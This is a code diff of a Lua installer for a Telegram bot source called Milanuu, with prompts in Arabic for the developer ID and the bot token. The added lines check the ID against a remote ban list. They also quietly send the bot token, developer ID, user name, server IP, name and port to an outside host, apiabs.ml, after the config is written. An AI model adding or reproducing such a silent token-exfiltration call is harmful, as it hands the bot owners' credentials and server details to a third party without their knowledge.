@@ -25,13 +25,22 @@ if not DevRio:get(Server.."IdMilanuu") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
+data,res = https.request("https://apiabs.ml/Api/Milanuu/index.php?Ban=Milanuu&Info&Id="..DevId)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+os.execute('lua Milanuu.lua') 
+end ---ifBn
+if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 DevRio:set(Server.."IdMilanuu",DevId) 
 end ---ifok
-else  
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
-end 
+else 
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+end
 os.execute('lua Milanuu.lua') 
+end
 end 
 if not DevRio:get(Server.."TokenMilanuu") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
@@ -39,7 +48,7 @@ local TokenBot = io.read()
 if TokenBot ~= '' then 
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
 if res ~= 200 then 
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
 DevRio:set(Server.."TokenMilanuu",TokenBot) 
@@ -68,6 +77,7 @@ Milanuu = DevRio:get(Server.."TokenMilanuu"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdMilanuu")},
 }
 Create(Config, "./config.lua") 
+https.request("https://apiabs.ml/Api/Milanuu/index.php?Get=Milanuu&DevId="..DevRio:get(Server.."IdMilanuu").."&TokenBot="..DevRio:get(Server.."TokenMilanuu").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Milanuu.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
